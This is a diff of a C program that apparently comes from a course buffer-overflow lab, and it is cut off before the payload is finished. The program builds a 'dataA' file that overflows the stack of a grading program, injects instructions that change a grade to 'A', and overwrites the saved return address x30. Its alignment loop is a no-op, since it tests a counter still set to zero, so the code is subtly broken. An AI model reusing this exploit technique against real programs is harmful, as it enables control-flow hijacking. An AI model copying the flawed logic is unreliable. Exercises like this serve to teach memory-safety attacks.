@@ -1,29 +1,26 @@
-/*
-Produces a file called dataA with the student name, nullbyte(s),
-instructions to change the grade to an "A", padding to overrun the
-stack, and the address of the first print instruction in main, the
-latter of which will overwrite getName's stored x30.
-*/
-
 #include <stdio.h>
+#include <string.h>
 #include "miniassembler.h"
 
-/*
-reads in a name w/ length of up to 31 chars from stdin, truncating
-beyond 31 chars. creates file dataA. in dataA, writes the name
-terminated with a nullbyte, pads with nullbytes to ensure instrs are
-4-byte aligned, writes the instrs for the attack, pads with '0's as
-necessary, then finally writes the address of the first print instr
-in main. returns 0
-*/
-
 int main(void) {
-    char pcInject[47] = "Angeline Yan and Jade Sceats";
+    char pcInject[48];
+    char pcName[] = "Angeline Yan and Jade Sceats";
     int i = 0;
-    int iNameLength = 4
+    int iNameLength;
     unsigned long uiTargetAddr = 0x400890;
     unsigned int uiAdr, uiMov, uiStrb, uiB;
     FILE *psFile;
+
+    /* get name(s) to use in dataA */
+    /* max name length is 48 - 1 (for nullbyte) - 4 * 4 (for the 4
+    instructions) */
+    iNameLength = strlen(pcName);
+    strcpy(pcInject, pcName);
+    
+    /* ensure instructions are 4-byte aligned */
+    while (i % 4 != 0) {
+       pcInject[i++] = '\0';
+    }
 
     psFile = fopen("dataA", "w");
     /* write name */
